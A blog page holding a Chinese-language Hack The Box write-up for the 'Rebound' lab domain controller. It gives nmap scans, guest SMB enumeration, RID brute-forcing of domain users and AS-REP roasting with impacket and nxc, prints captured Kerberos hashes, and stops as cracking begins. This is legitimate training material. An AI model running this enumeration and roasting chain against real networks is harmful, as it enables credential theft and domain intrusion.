<!DOCTYPE html>
<html lang="en">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>HTB-Rebound - Chromos2me&#39;s Blog</title>
  
    <link rel="shortcut icon" href="/favicon.jpg">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="HTB-Rebound - Chromos2me&#39;s Blog" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://chromos2me.github.io/2025/03/02/HTB-Rebound/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2025-03-01T16:00:00.000Z" />
  
  <meta property="og:article:author" content="Chromos2me" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 7.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="always"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Chromos2me&#39;s Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item" href="/tags">Tags</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/Chromos2me" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/HTB/">HTB</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2025</span>
        </div>
        

        <h1 class="title">HTB-Rebound</h1>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><img src="/2025/03/02/HTB-Rebound/Rebound.png" alt="Rebound"></p>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap进行端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 1000 -p- 10.10.11.231 -oA nmapscan/ports</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.231</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 60752 closed tcp ports (conn-refused), 4758 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49694/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">49720/tcp open  unknown</span><br><span class="line">49737/tcp open  unknown</span><br><span class="line">49803/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 189.13 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>过滤出开放端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> |<span class="built_in">paste</span> -sd <span class="string">&#x27;,&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>进行更详细的扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p<span class="variable">$ports</span> 10.10.11.231 -oA nmapscan/detail</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 20:33 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.231</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-17 19:16:08Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2025-02-16T18:33:25</span><br><span class="line">|_Not valid after:  2026-02-16T18:33:25</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-02-17T19:19:02+00:00; +6h42m55s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2025-02-16T18:33:25</span><br><span class="line">|_Not valid after:  2026-02-16T18:33:25</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-02-17T19:19:02+00:00; +6h42m56s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2025-02-16T18:33:25</span><br><span class="line">|_Not valid after:  2026-02-16T18:33:25</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-02-17T19:19:02+00:00; +6h42m55s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49694/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49720/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49737/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49803/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows 10 1703 (90%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-02-17T19:18:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 6h42m55s, deviation: 0s, median: 6h42m54s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 184.03 seconds</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：这里存在clock-skew: mean: 6h42m55s, deviation: 0s, median: 6h42m54s，我们在域渗透中需要对时间进行同步</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo ntpdate 10.10.11.231  //走udp协议</span><br></pre></td></tr></table></figure>
<p>或使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo net time <span class="built_in">set</span> -S 10.10.11.231  //走smb 445 139 135</span><br></pre></td></tr></table></figure>
</blockquote>
<p>可以同时进行udp端口扫描和漏洞脚本扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 40 10.10.11.231 -oA nmapscan/udp</span><br><span class="line">sudo nmap -script=vuln -p<span class="variable">$ports</span> 10.10.11.231 -oA nmapscan/vuln</span><br></pre></td></tr></table></figure>
<p>udp端口扫描结果如下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 20:44 CST</span><br><span class="line">Nmap scan report for 10.10.11.231</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 29 closed udp ports (port-unreach)</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">53/udp   open          domain</span><br><span class="line">123/udp  open          ntp</span><br><span class="line">137/udp  open|filtered netbios-ns</span><br><span class="line">138/udp  open|filtered netbios-dgm</span><br><span class="line">139/udp  open|filtered netbios-ssn</span><br><span class="line">500/udp  open|filtered isakmp</span><br><span class="line">514/udp  open|filtered syslog</span><br><span class="line">520/udp  open|filtered route</span><br><span class="line">1900/udp open|filtered upnp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">5353/udp open|filtered zeroconf</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 36.44 seconds</span><br></pre></td></tr></table></figure>
<p>漏洞脚本扫描结果如下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.231</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49694/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">49720/tcp open  unknown</span><br><span class="line">49737/tcp open  unknown</span><br><span class="line">49803/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|<span class="emphasis">_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="emphasis">|_</span>smb-vuln-ms10-054: false</span><br><span class="line">|<span class="emphasis">_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">Nmap done: 1 IP address (1 host up) scanned in 200.79 seconds</span></span><br></pre></td></tr></table></figure>
<p>刚才在我们的nmap扫描结果中发现了两个域名<code>rebound.htb</code>和<code>dc01.rebound.htb</code>，我们将其加入到hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&#x27;1i 10.10.11.231 rebound.htb dc01.rebound.htb&#x27;</span> /etc/hosts</span><br></pre></td></tr></table></figure>
<p>从上面的扫描中我们很容易的可以判断出这是一台域控机器</p>
<h2 id="smb共享枚举"><a href="#smb共享枚举" class="headerlink" title="smb共享枚举"></a>smb共享枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb --shares</span><br></pre></td></tr></table></figure>
<p>从输出结果中没有发现有用信息</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217213158.png" alt="微信截图_20250217213158"></p>
<p>如果自己搭建过smb共享的话我们知道任何不属于smb账户的账户均能被映射成guest账户（前提是开放了匿名共享），我们尝试进行登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb -u chromos2me -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
<p>可以看到我们对<code>IPC$</code>和<code>Shared</code>两个文件夹存在读取权限</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217213717.png" alt="微信截图_20250217213717"></p>
<p>我们利用impacket工具包进行读取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbclient rebound.htb/chromos2me@10.10.11.231 -no-pass</span><br></pre></td></tr></table></figure>
<p>是一个很典型的smb共享</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217214913.png" alt="微信截图_20250217214913"></p>
<p>我们枚举一下<code>Shared</code>共享，发现没有可用的信息</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217215021.png" alt="微信截图_20250217215021"></p>
<p>看一下<code>IPC$</code>共享，发现存在一些东西，但是似乎用不上</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218155315.png" alt="微信截图_20250218155315"></p>
<h2 id="RID枚举"><a href="#RID枚举" class="headerlink" title="RID枚举"></a>RID枚举</h2><p>我们只要对域有一定的了解我们就会知道SID的最后一位是<strong>RID（Relative Identifier，相对标识符）</strong>，用于唯一标识域或本地系统中的用户和组，通过枚举RID我们可以对系统中的用户及其所属组有一定的掌握</p>
<p>常见的进行枚举的方法有很多，如Impacket的 <code>lookupsid.py</code>，或是利用<code>rpcclient</code>下的<code>enumdomusers</code>命令（权限要求相对较高，枚举失败可能性很大）等等</p>
<p>利用rpc匿名登录进行枚举显示权限不足</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218160315.png" alt="微信截图_20250218160315"></p>
<p>更换枚举方式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-lookupsid chromos2me@rebound.htb -no-pass  </span><br></pre></td></tr></table></figure>
<p>同时可以结合选项<code>maxRid</code>枚举更大的SID</p>
<blockquote>
<p><code>maxRid                max Rid to check (default 4000)</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-lookupsid chromos2me@rebound.htb 40000 -no-pass  </span><br></pre></td></tr></table></figure>
<p>枚举结果如下所示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at rebound.htb</span><br><span class="line">[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: rebound\Administrator (SidTypeUser)</span><br><span class="line">501: rebound\Guest (SidTypeUser)</span><br><span class="line">502: rebound\krbtgt (SidTypeUser)</span><br><span class="line">512: rebound\Domain Admins (SidTypeGroup)</span><br><span class="line">513: rebound\Domain Users (SidTypeGroup)</span><br><span class="line">514: rebound\Domain Guests (SidTypeGroup)</span><br><span class="line">515: rebound\Domain Computers (SidTypeGroup)</span><br><span class="line">516: rebound\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: rebound\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: rebound\Schema Admins (SidTypeGroup)</span><br><span class="line">519: rebound\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: rebound\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: rebound\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: rebound\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: rebound\Protected Users (SidTypeGroup)</span><br><span class="line">526: rebound\Key Admins (SidTypeGroup)</span><br><span class="line">527: rebound\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: rebound\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: rebound\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: rebound\DC01$ (SidTypeUser)</span><br><span class="line">1101: rebound\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: rebound\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1951: rebound\ppaul (SidTypeUser)</span><br><span class="line">2952: rebound\llune (SidTypeUser)</span><br><span class="line">3382: rebound\fflock (SidTypeUser)</span><br><span class="line">5277: rebound\jjones (SidTypeUser)</span><br><span class="line">5569: rebound\mmalone (SidTypeUser)</span><br><span class="line">5680: rebound\nnoon (SidTypeUser)</span><br><span class="line">7681: rebound\ldap_monitor (SidTypeUser)</span><br><span class="line">7682: rebound\oorend (SidTypeUser)</span><br><span class="line">7683: rebound\ServiceMgmt (SidTypeGroup)</span><br><span class="line">7684: rebound\winrm_svc (SidTypeUser)</span><br><span class="line">7685: rebound\batch_runner (SidTypeUser)</span><br><span class="line">7686: rebound\tbrady (SidTypeUser)</span><br><span class="line">7687: rebound\delegator$ (SidTypeUser)</span><br></pre></td></tr></table></figure>
<p>我们提取出我们需要的用户账号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> rids | grep SidTypeUser | grep -v <span class="string">&#x27;\$&#x27;</span> | awk -F <span class="string">&#x27;\&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27;(&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tee</span> <span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>现在我们拥有了域内用户信息，可以尝试进行AS-REP Roasting攻击，即那些没有进行kerberos身份预验证的账户，他们可以直接向KDC请求TGT票据，KDC会返回TGT票据以及利用用户密码哈希加密的Session Key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-GetNPUsers -usersfile <span class="built_in">users</span> -request -format hashcat -dc-ip 10.10.11.231 rebound.htb/  </span><br></pre></td></tr></table></figure>
<p>我们拿到一组票据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23<span class="variable">$jjones</span>@REBOUND.HTB:90eceab92a97ec106b04a553836ccf63<span class="variable">$29864af1884ffda71304e868cbccc40d0b7412e4aad18d712c47484c2ebe144153e3ded5bb88eff602236e8c741dd1135dd60069c280c3901e11f5185a675e76dafeb085e6322604b1ab76ab70bd684dbe62979ec5617ba84508749be580bfd3fb15673be2aaa24dd37d4cee7dc001f5edae563d08487de7a798d298b4bec490b14435ab563d864b1b3721eed73315afe782abc63c7c61d40f11047c4c1056f9c10abbb08363fca070907015419b2c0c0b56de28e4d8abbe11d7c57a944cecc6dc501ba1fe1e648abdbfc0080d6734f1030cfbb6fd3de584de2967feb9c358a90af71258bfff0544eeaf</span></span><br></pre></td></tr></table></figure>
<p>或者利用nxc进行asrep-roasting攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc ldap -u <span class="built_in">users</span> -p <span class="string">&#x27;&#x27;</span> --asreproast asrep rebound.htb</span><br></pre></td></tr></table></figure>
<p>返回相同的结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">LDAP        10.10.11.231    445    DC01             $krb5asrep$23<span class="variable">$jjones</span>@REBOUND.HTB:4d4b23e6080644cba535559a570eec9c<span class="variable">$03a8ee4eb3373b908413c80b80f7829f9ce0229ea9891fda70d8e3759d3bbbaee6c252101aa5698cfb400b13158781d9b2e0723e001415751ccea4b247bd32dbfcf610a1245c19ed27920fdd5ad1fc00fd521633527ddf5e153039584f96449b088b860a00b7d7cf61985d6bbc9b6a3e30f130ccf0716bbb635d01fcdf44e1e91a7ed9000fd59d775e55d104eb083dd125c3190ce0757a8ac2638f072df7472455e453874c8a1209288bd8915503fd10d2dc932fe6476606dba5f347d9fd3cd902090c672a0808d5f6610d062298ac50c07581af14d06c20290d1d8181d891245beef1ab182a027146c5</span></span><br></pre></td></tr></table></figure>
<p>利用hashcat进行破解</p>
